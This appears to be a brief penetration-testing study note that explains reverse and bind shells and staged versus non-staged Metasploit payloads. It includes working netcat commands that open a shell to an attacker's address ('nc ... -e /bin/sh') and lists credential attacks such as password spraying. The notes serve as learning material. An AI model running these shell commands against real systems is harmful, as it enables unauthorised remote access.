# Exploitation Basics
## Reverse vs Bind Shells

[Source](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)

### Reverse Shell
95% of the time you will use reverse shell

~~~bash
# A victim connecting to us
# We are the listener and the target is who connect to us
# $ATTACKER - $IP 192.168.1.1
nc -lvnp 4444 # listening

# $TARGET - $IP 192.168.1.2
nc 192.168.1.1 4444 -e /bin/sh # Connecting
~~~

### Bind Shell
We connect to the victim

~~~bash
# Attacker - 192.168.1.1
nc 192.168.1.2 4444 # Connecting

#Target - 192.168.1.2
nc -lvp 4444 -e /bin/sh # Listening
~~~

## Staged vs Non-Staged Payload
### Non-Staged
Sends the exploit shellcode all at once
Larger in size and won't always work

~~~bash
# Example
windows/meterpreter_reverse_tcp
~~~

### Staged
Sends payload in stages
Can be less stable

~~~bash
# Example
windows/meterpreter/reverse_tcp
~~~

## Other methods
- Password Spraying and Credential Stuffing
- Brute Force Attacks
- Manual exploitation
- Gathering access using metasploit
